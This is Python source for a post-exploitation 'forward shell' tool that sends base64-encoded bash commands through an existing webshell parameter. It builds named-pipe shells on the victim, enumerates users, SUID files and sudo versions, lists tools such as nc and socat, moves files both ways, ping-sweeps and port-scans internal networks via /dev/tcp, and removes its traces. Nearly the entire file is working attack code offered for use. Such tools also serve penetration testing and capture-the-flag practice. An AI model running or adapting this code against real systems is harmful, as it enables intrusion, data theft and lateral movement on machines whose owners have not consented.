#!/usr/bin/env python3

# ------------------------------------
# Github: https://github.com/D3Ext
# Blog: https://d3ext.github.io
# Discord: @d3ext
# Twitter: @d3ext
# ------------------------------------

# Packages
import requests
import signal
import sys
import time
import argparse, re
from base64 import b64encode, b64decode
from random import randrange

# Katana banner
global mybanner
mybanner = '''\n              /\                               ______,....----,
/VVVVVVVVVVVVVV|===================""""""""""""       ___,..-\'
`^^^^^^^^^^^^^^|======================----------""""""
              \/    with <3 by D3Ext
                    v0.2'''

# Global Variables
global pipes_path, infile, outfile, mod, command_to_exec, tty, user, hostname, requests_timeout
mod = randrange(1, 9999)

# Colors
class c:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'

# Ctrl + C Function
def exit_handler(sig, frame):
    print(c.BLUE + "\n\n[" + c.YELLOW + "!" + c.BLUE + "] Interrupt handler received, exiting..." + c.END)
    removeFiles(url, parameter)
    sys.exit(0)

signal.signal(signal.SIGINT, exit_handler)

# Remove input and output files on exit
def removeFiles(url, parameter):
    removeCommand = f"""rm -rf {pipes_path}"""
    base64command = b64encode(removeCommand.encode()).decode()

    removeData = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    print(c.BLUE + "[" + c.YELLOW + "+" + c.BLUE + "] Deleting named pipes..." + c.END)
    requests.get(url, params=removeData, timeout=requests_timeout)

# Arguments parser function
def parseArgs():
    p = argparse.ArgumentParser(description="D3Ext's Forward Shell - Enhanced forward shell with integrated commands")
    p.add_argument('-u', '--url', help="url of the webshell (i.e. http://10.10.10.10/webshell.php)", required=True)
    p.add_argument('-p', '--parameter', help="parameter of the webshell to execute commands (i.e. cmd)", required=True)
    p.add_argument('-t', '--timeout', help="timeout of requests that execute commands (default 20s)", type=int, default=20, required=False)
    p.add_argument('--path', help="path in which to create named pipes (default /dev/shm/.fs)", type=str, default="/dev/shm/.fs", required=False)
    p.add_argument('-v', '--verbose', help="print more information", required=False)

    return p.parse_args()

# Check if url receives requests
def checkConn(url):
    try:
        r = requests.get(url, timeout=4)
        if r.status_code == 200:
            print(c.BLUE + "\n[" + c.YELLOW + "+" + c.BLUE + "] Connection established succesfully!" + c.END)
        else:
            print(c.BLUE + "\n[" + c.YELLOW + "-" + c.BLUE + "] Connection refused!\n" + c.END)
            sys.exit(0)
    except:
        print(c.BLUE + "\n[" + c.YELLOW + "-" + c.BLUE + "] Connection refused!\n" + c.END)
        sys.exit(0)

# Function to create the fifos on the victim (required to have an interactive tty)
def createFifos(url, parameter):

    # Create directory with the files in {pipes_path}
    raw_command = f"""mkdir {pipes_path}"""
    execCommandWithoutFifos(url, parameter, raw_command)

    # Create input and output files under {pipes_path}
    try:
        raw_command = f"""mkfifo {infile}; tail -f {infile} | /bin/sh 2>&1 > {outfile}"""
        base64command = b64encode(raw_command.encode('utf-8')).decode('utf-8')

        fifosData = {
            f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
        }

        print(c.BLUE + "[" + c.YELLOW + "*" + c.BLUE + f"""] Creating named pipes on target system under {pipes_path}/""" + c.END)
        requests.get(url, params=fifosData, timeout=4)

    except:
        None

    return None

# Function to read the file with the executed commands 
def readCommand(url, parameter):
    raw_command = f"""/bin/cat {outfile}"""
    base64command = b64encode(raw_command.encode('utf-8')).decode('utf-8')

    readData = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.get(url, params=readData, timeout=requests_timeout)

    return r.text

# Function to clear the output file with every command
def clearOutput(url, parameter):
    raw_command = f"""echo '' > {outfile}"""
    base64command = b64encode(raw_command.encode('utf-8')).decode('utf-8')

    clearData = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    requests.get(url, params=clearData, timeout=requests_timeout)

# Function to execute commands after creating the fifos
def execCommand(url, parameter, command):
    base64command = b64encode(command.encode('utf-8')).decode('utf-8')

    rce_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d > {infile}'
    }

    requests.get(url, params=rce_data, timeout=requests_timeout)

# Function to execute especial commands without the fifos and returning them
def execCommandWithoutFifos(url, parameter, command):
    base64command = b64encode(command.encode('utf-8')).decode('utf-8')

    rce_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.get(url, params=rce_data, timeout=requests_timeout)

    return r.text

# Function to check useful binaries on the victim
def getBinaries(url, parameter):
    raw_command = """which ping nmap aws nc ncat netcat nc.traditional wget curl gcc make gdb base64 socat python python2 python3 python2.7 python3.7 perl php ruby xterm sudo docker lxc 2>/dev/null"""
    base64command = b64encode(raw_command.encode('utf-8')).decode('utf-8')

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.get(url, params=enum_data, timeout=requests_timeout)

    return r.text

# Function to enumerate the system
def enumSys(url, parameter):
    user = execCommandWithoutFifos(url, parameter, "whoami")

    hostname = execCommandWithoutFifos(url, parameter, "hostname")

    ip = execCommandWithoutFifos(url, parameter, "hostname -I")

    uname = execCommandWithoutFifos(url, parameter, "uname -a")

    id_output = execCommandWithoutFifos(url, parameter, "id")

    users = execCommandWithoutFifos(url, parameter, "ls /home")
    users = cleanHTML(users)
    users = users.strip('\n').replace('\n', ', ')

    path = execCommandWithoutFifos(url, parameter, "echo $PATH")

    sudo_version = execCommandWithoutFifos(url, parameter, """sudo --version 2>/dev/null | head -n 1 | awk '{print $NF}'""")

    return user, hostname, ip, uname, id_output, users, path, sudo_version

# Function to upload files
def uploadFile(url, parameter, file_to_upload):
    print(c.BLUE + "\n[" + c.YELLOW + "*" + c.BLUE + "] Uploading file to the server" + c.END)
    fileContent = open(file_to_upload, "r").read()
    base64file = b64encode(fileContent.encode()).decode()
    upload_command = f"""echo {base64file} | base64 -d > {pipes_path}/{file_to_upload}"""

    uploadData = {
        f"{parameter}": f"{upload_command}"
    }

    requests.get(url, params=uploadData, timeout=requests_timeout)

    time.sleep(1)
    print(c.BLUE + "[" + c.YELLOW + "+" + c.BLUE + f"] {file_to_upload} uploaded successfully in {pipes_path}/{file_to_upload}\n" + c.END)

# Function to download a file
def downloadFile(url, parameter, file_to_download):
    print(c.BLUE + "\n[" + c.YELLOW + "*" + c.BLUE + "] Downloading file from server" + c.END)
    download_command = f"""base64 -w 0 {file_to_download}""" 
    base64command = b64encode(download_command.encode()).decode()

    downloadData = {
        f"{parameter}": f"echo {base64command} | base64 -d | bash"
    }

    r = requests.get(url, params=downloadData, timeout=requests_timeout)

    time.sleep(1)
    fileContent = cleanHTML(r.text)
    fileContent = b64decode(fileContent).decode()

    stored_file = file_to_download.split('/')[-1]
    f = open(f"{stored_file}", "w")
    f.write(fileContent)
    f.close()

    print(c.BLUE + "[" + c.YELLOW + "+" + c.BLUE + f"] File successfully downloaded as {stored_file}\n" + c.END)

# Perform a basic ping sweep to detect active IPs
def hostScan(url, parameter, ip):
    
    print(c.BLUE + "\n[" + c.YELLOW + "+" + c.BLUE + "] Performing host discovery, system must have 'ping' installed\n" + c.END)
    raw_command = """for number in $(seq 1 254); do timeout 1 bash -c "ping -c 1 %s.${number}" &>/dev/null && echo -e "%s.${number}" >> /dev/shm/.fs/logs.tmp & done""" % (ip, ip)
    base64command = b64encode(raw_command.encode()).decode()
    
    hostData = {
        f"{parameter}": f"echo {base64command} | base64 -d | bash"
    }
    
    r = requests.get(url, params=hostData, timeout=requests_timeout)

    raw_command = f"""cat {pipes_path}/logs.tmp"""
    base64command = b64encode(raw_command.encode()).decode()
    
    hostData = {
        f"{parameter}": f"echo {base64command} | base64 -d | bash"
    }

    r = requests.get(url, params=hostData, timeout=requests_timeout)
    
    data = cleanHTML(r.text)
    if data:
        print(c.YELLOW + "Hosts" + c.END)
        print(c.YELLOW + "-----" + c.END)
        print(data)
    else:
        print(c.BLUE + "[" + c.END + c.YELLOW + "-" + c.END + c.BLUE + "] No hosts discovered\n" + c.END)

# Function to discover open ports on especified ip
def portScan(url, parameter, ip):

    print(c.BLUE + "\n[" + c.YELLOW + "+" + c.BLUE + "] Starting port discovery, no requirements are needed\n" + c.END)
    raw_command = """for port in $(seq 1 5000); do timeout 1 bash -c "(echo '' > /dev/tcp/%s/${port})" 2>/dev/null && echo -e "${port}" & done""" % (ip)
    base64command = b64encode(raw_command.encode()).decode()

    portData = {
        f"{parameter}": f"echo {base64command} | base64 -d | bash"
    }
    
    r = requests.get(url, params=portData, timeout=requests_timeout)

    data = cleanHTML(r.text)
    if data:
        print(c.YELLOW + "Ports" + c.END)
        print(c.YELLOW + "-----" + c.END)
        print(data)
    else:
        print(c.BLUE + "[" + c.YELLOW + "-" + c.BLUE + "] No ports discovered\n" + c.END)

# Clean RCE output
def cleanHTML(out):
    clean = re.compile('<.*?>')
    cleanout = re.sub(clean, '', out)
    try:
        if tty == True:
            cleanout = cleanout.split(f'\x00{command_to_exec}')[1]
            cfile = open("/dev/shm/.clean", "w")
            cfile.write(cleanout)
            cfile.close()

            cleanout = open("/dev/shm/.clean", "r").read()
            cleanout = "\n".join(cleanout.split("\n")[:-1])
    except:
        pass

    return cleanout

# Main Function
if __name__ == '__main__':

    # Parse arguments and declare variables
    parser = parseArgs()

    url = parser.url
    parameter = parser.parameter
    verbose = parser.verbose
    requests_timeout = parser.timeout
    pipes_path = parser.path

    if pipes_path.endswith('/'):
        pipes_path = pipes_path[:-1]

    # Define named pipes files
    infile = f"{pipes_path}/input.{mod}"
    outfile = f"{pipes_path}/output.{mod}"

    # Print banner
    print(c.YELLOW + mybanner + c.END)

    # Check connections to the webshell
    checkConn(url)

    # Create an interactive shell
    createFifos(url, parameter)
    print(c.BLUE + "[" + c.YELLOW + "*" + c.BLUE + "] Gathering target information to establish an interactive shell..." + c.END)

    user = execCommandWithoutFifos(url, parameter, "whoami")
    hostname = execCommandWithoutFifos(url, parameter, "hostname")

    user = cleanHTML(user)
    hostname = cleanHTML(hostname)

    print(c.BLUE + "\n[" + c.YELLOW + "+" + c.BLUE + "] Type dfs-help to see custom commands\n" + c.END)

    customCommands = ["dfs-help", "dfs-enum", "dfs-exit", "dfs-binaries", "dfs-download", "dfs-upload", "dfs-hostscan", "dfs-portscan", "dfs-tty"]
    
    command_to_exec = ""
    first_command = False

    # Loop to execute commands
    while True:
        # Check if user has changed to update the shell prompt
        try:
            if command_to_exec == "sh":
                execCommand(url, parameter, "whoami" + "\n")
                user = readCommand(url, parameter)
                user = cleanHTML(user)
                user = user.split("whoami")[1][:-4].replace("\n", "").replace("\r", "")                
                clearOutput(url, parameter)
                
                execCommand(url, parameter, "hostname" + "\n")
                hostname = readCommand(url, parameter)
                hostname = cleanHTML(hostname)
                hostname = hostname.split("hostname")[1][:-4].replace("\n", "").replace("\r", "")                
                clearOutput(url, parameter)

        except:
            pass
        
        # Custom prompt
        if user == "root":
            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~# ")
        else:
            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~$ ")

        # Here check introduced commands
        if command_to_exec == "dfs-help":
            print(c.YELLOW + "\nCommands\t\tDescription" + c.END)
            print(c.YELLOW + "--------\t\t-----------" + c.END)
            print(c.BLUE + "dfs-tty\t\t\tupgrade your shell with an interactive TTY (recommended)" + c.END)
            print(c.BLUE + "dfs-enum\t\tenumerate potential privesc information on system (users, groups, system info...)" + c.END)
            print(c.BLUE + "dfs-upload\t\tupload a local file to remote server" + c.END)
            print(c.BLUE + "dfs-download\t\tdownload specified file from remote server" + c.END)
            print(c.BLUE + "dfs-binaries\t\tsearch common binaries that can be used during pentest" + c.END)
            print(c.BLUE + "dfs-hostscan\t\tscan active hosts in a valid range (i.e. 192.168.1)" + c.END)
            print(c.BLUE + "dfs-portscan\t\tscan 5000 most common ports of a ip (i.e. 192.168.1.1)" + c.END)
            print(c.BLUE + "dfs-exit\t\texit from forward shell and delete files created on remote server\n" + c.END)
        
        if command_to_exec == "dfs-tty":
            tty = True
            print(c.BLUE + "\n[" + c.YELLOW + "*" + c.BLUE + "] Creating a fully interactive TTY" + c.END)

            execCommand(url, parameter, """script /dev/null -c sh""" + "\n")
            clearOutput(url, parameter)

            print(c.BLUE + "[" + c.YELLOW + "+" + c.BLUE + "] Shell upgraded successfully\n" + c.END)

        if command_to_exec == "dfs-enum":
            print(c.BLUE + "\n[" + c.YELLOW + "*" + c.BLUE + "] Enumerating system, please wait a few seconds..." + c.END)
            user, hostname, ip, uname, id_output, users, path, sudo_version = enumSys(url, parameter)

            suid = execCommandWithoutFifos(url, parameter, """timeout 13 bash -c 'find / \-perm -4000 2>/dev/null'""")

            user = cleanHTML(user)
            hostname = cleanHTML(hostname)
            ip = cleanHTML(ip)
            uname = cleanHTML(uname)
            id_output = cleanHTML(id_output)
            users = cleanHTML(users)
            path = cleanHTML(path)
            sudo_version = cleanHTML(sudo_version)
            suid = cleanHTML(suid)

            print(c.YELLOW + "\nInformation" + c.END)
            print(c.YELLOW + "-----------" + c.END)
            print(c.BLUE + "Current user: " + user.strip('\n') + c.END)
            print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
            print(c.BLUE + "Path: " + path.strip('\n') + c.END)
            print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
            print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
            print(c.BLUE + "Users in /home: " + users + c.END)
            if sudo_version:
                print(c.BLUE + "Sudo version: " + sudo_version.strip('\n') + c.END)
            else:
                print(c.BLUE + "Sudo version: Not found" + c.END)
            
            print(c.BLUE + "System info: " + uname + c.END) 
            print(c.YELLOW + "SUID Files" + c.END)
            print(c.YELLOW + "----------" + c.END)
            print(c.BLUE + suid + c.END)

            raw_command = """cat /proc/net/tcp | grep -v "sl" | awk '{print $3}' FS=":" | awk '{print $1}' | sort -u"""
            hex_ports = execCommandWithoutFifos(url, parameter, raw_command)
            hex_ports = cleanHTML(hex_ports)

            print(c.YELLOW + "Local ports" + c.END)
            print(c.YELLOW + "-----------" + c.END)
            for port in hex_ports.strip('\n').split('\n'):
                print(c.BLUE + str(int(port, 16)) + c.END)
            print('')
        
        if command_to_exec == "dfs-hostscan":
            print(c.BLUE + "\n[" + c.YELLOW + "+" + c.BLUE + "] Provide a valid ip range" + c.END)
            print(c.BLUE + "[" + c.YELLOW + "+" + c.BLUE + "] Example: dfs-hostscan 192.168.1\n" + c.END)
           
        try:
            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-hostscan":
                ip = command_to_exec.split(' ')[1]
                hostScan(url, parameter, ip)
        except:
            pass


        if command_to_exec == "dfs-portscan":
            print(c.BLUE + "\n[" + c.YELLOW + "+" + c.BLUE + "] Provide a valid ip" + c.END)
            print(c.BLUE + "[" + c.YELLOW + "+" + c.BLUE + "] Example: dfs-portscan 192.168.1.2\n" + c.END)

        try:
            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-portscan":
                ip = command_to_exec.split(' ')[1]
                portScan(url, parameter, ip)
        except:
            pass

        if command_to_exec == "dfs-binaries":
            binList = getBinaries(url, parameter)
            binList = cleanHTML(binList)
            print(c.YELLOW + "\nUseful Binaries" + c.END)
            print(c.YELLOW + "---------------" + c.END)
            print(c.BLUE + binList + c.END)

        # Upload panel and function
        if command_to_exec == "dfs-upload":
            print(c.BLUE + "\n[" + c.YELLOW + "+" + c.BLUE + "] Example: dfs-upload file.txt" + c.END)
            print(c.BLUE + "[" + c.YELLOW + "!" + c.BLUE + "] Doesn't work with binaries\n" + c.END)
        
        try:
            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-upload":
                file_to_upload = command_to_exec.split(' ')[1]
                uploadFile(url, parameter, file_to_upload)
        except:
            pass

        # Download panel and function
        if command_to_exec == "dfs-download":
            print(c.BLUE + "\n[" + c.YELLOW + "+" + c.BLUE + "] Example: dfs-download /path/to/the/file" + c.END)
            print(c.BLUE + "[" + c.YELLOW + "!" + c.BLUE + "] Doesn't work with binaries\n" + c.END)

        try:
            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-download":
                file_to_download = command_to_exec.split(' ')[1]
                downloadFile(url, parameter, file_to_download)
        except:
            pass

        if command_to_exec == "dfs-exit":
            print()
            removeFiles(url, parameter)
            print(c.BLUE + "[" + c.YELLOW + "*" + c.BLUE + "] Quitting from shell, bye!\n" + c.END)
            sys.exit(0)

        if command_to_exec.split(' ')[0] not in customCommands:
            # Execute especified command
            execCommand(url, parameter, command_to_exec + "\n")

            # Read command output
            resp = readCommand(url, parameter)

            # Print command output
            resp = cleanHTML(resp)

            if first_command == False:
                print()


            first_command = True

            # Check if dfs-tty has been executed
            try:
                if tty == True:
                    print("\n" + resp.strip('\n') + "\n")
            except:
                print(resp)

            # Clear the file of the output
            clearOutput(url, parameter)



